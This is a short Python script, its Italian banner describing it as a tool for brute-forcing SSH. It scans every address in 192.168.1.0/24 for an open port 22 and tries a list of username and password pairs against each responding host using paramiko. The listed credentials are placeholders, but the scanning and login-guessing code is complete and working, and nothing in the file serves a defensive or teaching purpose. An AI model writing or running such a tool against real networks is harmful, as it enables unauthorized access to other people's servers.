import socket
import paramiko
abba = """

Zozozozozo zzz zono M M mmm Att teo

uno strumento per bruteforsare esseesseacca
"""
print(abba)
# Set the IP range to scan
network = "192.168.1."

# Set the port to scan for
port = 22

# Set the login credentials to try
credentials = [
    ("username1", "password1"),
    ("username2", "password2"),
]

# Scan the network for open ports
for i in range(1, 256):
    ip = network + str(i)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.5)
    if s.connect_ex((ip, port)) == 0:
        print(f"{ip}:22 is open")
        # Try logging in with each set of credentials
        for username, password in credentials:
            print(f"Trying {username}:{password}...")
            # Create an SSH client
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            # Try to connect to the server and log in
            try:
                client.connect(ip, port=port, username=username, password=password)
                print("Login successful!")
                client.close()
                break
            except paramiko.AuthenticationException:
                print("Login failed")
    s.close()
